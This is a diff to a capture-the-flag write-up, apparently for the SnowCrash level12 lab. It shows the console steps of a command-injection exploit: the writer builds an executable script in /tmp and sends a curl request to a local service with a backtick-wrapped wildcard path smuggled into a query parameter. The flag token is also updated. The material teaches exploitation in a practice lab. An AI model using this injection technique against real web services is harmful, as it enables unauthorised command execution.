@@ -45,25 +45,27 @@ n(t(param("x"), param("y")));
 ```
 
 ```console
-level12@SnowCrash:~$ echo "getflag > /tmp/flag12.txt" > /tmp/RUNME
+level12@SnowCrash:~$ echo "#\!/bin/bash" > /tmp/RUNME
+level12@SnowCrash:~$ echo "getflag > /tmp/flag12.txt" >> /tmp/RUNME
 ```
 
 ```console
 level12@SnowCrash:~$ cat /tmp/RUNME
+#\!/bin/bash
 getflag > /tmp/flag12.txt
 ```
 
 ```console
-level12@SnowCrash:~$ chmod -v +x /tmp/RUNME
-mode of `/tmp/RUNME' changed from 0664 (rw-rw-r--) to 0775 (rwxrwxr-x)
+level12@SnowCrash:~$ chmod 777 -v /tmp/RUNME
+mode of `/tmp/RUNME' changed from 0644 (rw-r--r--) to 0777 (rwxrwxrwx)
 ```
 
 ```console
 curl '127.0.0.1:4646?x=`/*/RUNME`'
-Password: Erf nope..
+..level12@SnowCrash:~$ 
 ```
 
 ```console
 level12@SnowCrash:~$ cat /tmp/flag12.txt
-Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
 ```
